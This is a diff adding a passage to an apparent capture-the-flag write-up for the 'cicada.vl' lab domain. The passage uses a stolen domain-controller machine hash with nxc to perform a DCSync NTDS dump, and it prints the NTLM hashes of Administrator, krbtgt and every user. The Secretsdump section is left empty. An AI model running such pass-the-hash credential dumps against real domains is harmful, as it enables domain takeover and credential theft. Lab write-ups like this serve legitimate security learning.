@@ -372,3 +372,35 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 ```
 I now have a hash and a ccache for the DC machine account so now i should be able to abuse a DCSync attack!
 
+I can do this with either secretsdump or just in nxc
+
+With nxc:
+```python
+nxc smb DC-JPQ225.cicada.vl -u 'dc-jpq225$' -H 'a65952c664e9cf5de60195626edbeee3' -k --ntds
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\dc-jpq225$:a65952c664e9cf5de60195626edbeee3 
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dd165a43fcb66d6a0e2924bb67e040c:::
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Shirley.West:1104:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Jordan.Francis:1105:aad3b435b51404eeaad3b435b51404ee:f5caf661b715c4e1435dfae92c2a65e3:::
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Jane.Carter:1106:aad3b435b51404eeaad3b435b51404ee:7e133f348892d577014787cbc0206aba:::
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Joyce.Andrews:1107:aad3b435b51404eeaad3b435b51404ee:584c796cd820a48be7d8498bc56b4237:::
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Daniel.Marshall:1108:aad3b435b51404eeaad3b435b51404ee:8cdf5eeb0d101559fa4bf00923cdef81:::
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Rosie.Powell:1109:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Megan.Simpson:1110:aad3b435b51404eeaad3b435b51404ee:6e63f30a8852d044debf94d73877076a:::
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Katie.Ward:1111:aad3b435b51404eeaad3b435b51404ee:42f8890ec1d9b9c76a187eada81adf1e:::
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Richard.Gibbons:1112:aad3b435b51404eeaad3b435b51404ee:d278a9baf249d01b9437f0374bf2e32e:::
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Debra.Wright:1113:aad3b435b51404eeaad3b435b51404ee:d9a2147edbface1666532c9b3acafaf3:::
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        DC-JPQ225$:1000:aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3:::
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] Dumped 14 NTDS hashes to /home/kali/.nxc/logs/ntds/DC-JPQ225_DC-JPQ225.cicada.vl_2026-06-01_205635.ntds of which 13 were added to the database
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC-JPQ225_DC-JPQ225.cicada.vl_2026-06-01_205635.ntds | cut -d ':' -f1
+```
+
+With Secretsdump:
+```python
+
+```
